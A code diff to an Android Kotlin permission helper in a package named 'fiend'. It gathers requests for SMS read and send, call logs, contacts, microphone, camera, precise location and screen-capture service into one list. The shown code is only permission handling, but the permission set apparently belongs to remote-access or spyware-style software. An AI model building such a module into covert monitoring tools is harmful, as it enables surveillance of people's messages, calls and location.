@@ -3,6 +3,7 @@ package willi.fiend.Utils
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
+import android.os.Build
 import com.karumi.dexter.Dexter
 import com.karumi.dexter.MultiplePermissionsReport
 import com.karumi.dexter.PermissionToken
@@ -11,21 +12,35 @@ import com.karumi.dexter.listener.multi.MultiplePermissionsListener
 
 class AppPermission(private val context: Context) {
     fun getPerms(onPermissionsChecked: () -> Unit) {
+        // ✅ قائمة الأذونات الأساسية
+        val permissions = mutableListOf(
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.INTERNET,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.CAMERA,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        
+        // ✅ إضافة أذونات Android 13+ (الإشعارات)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+        
+        // ✅ إضافة أذونات Android 14+ (خدمات الخلفية)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            permissions.add(Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION)
+        }
+        
         Dexter
             .withContext(context)
-            .withPermissions(
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.INTERNET,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.CAMERA,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ).withListener(object : MultiplePermissionsListener {
+            .withPermissions(permissions)
+            .withListener(object : MultiplePermissionsListener {
                 override fun onPermissionsChecked(p0: MultiplePermissionsReport?) {
                     onPermissionsChecked()
                 }
@@ -33,8 +48,22 @@ class AppPermission(private val context: Context) {
                 override fun onPermissionRationaleShouldBeShown(
                     p0: MutableList<PermissionRequest>?,
                     p1: PermissionToken?
-                ) {}
+                ) {
+                    // ✅ في حال رفض الإذن، استمر
+                    p1?.continuePermissionRequest()
+                }
             }).check()
+    }
+
+    // ✅ دالة جديدة للتحقق من إذن الإشعارات
+    fun checkPostNotifications(): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            return true // Android 12 والإصدارات الأقدم لا تحتاج هذا الإذن
+        }
+        val granted = PackageManager.PERMISSION_GRANTED
+        val requiredPermission = Manifest.permission.POST_NOTIFICATIONS
+        val checkPrem: Int = context.checkCallingOrSelfPermission(requiredPermission)
+        return checkPrem == granted
     }
 
     fun checkReadExternalStorage(): Boolean {
@@ -85,18 +114,21 @@ class AppPermission(private val context: Context) {
         val checkPrem: Int = context.checkCallingOrSelfPermission(requiredPermission)
         return checkPrem == granted
     }
+    
     fun checkCaptureMic(): Boolean {
         val granted = PackageManager.PERMISSION_GRANTED
         val requiredPermission = Manifest.permission.RECORD_AUDIO
         val checkPrem: Int = context.checkCallingOrSelfPermission(requiredPermission)
         return checkPrem == granted
     }
+    
     fun checkCaptureCam(): Boolean {
         val granted = PackageManager.PERMISSION_GRANTED
         val requiredPermission = Manifest.permission.CAMERA
         val checkPrem: Int = context.checkCallingOrSelfPermission(requiredPermission)
         return checkPrem == granted
     }
+    
     fun checkGetLocation(): Boolean {
         val granted = PackageManager.PERMISSION_GRANTED
         val requiredPermission = Manifest.permission.ACCESS_FINE_LOCATION
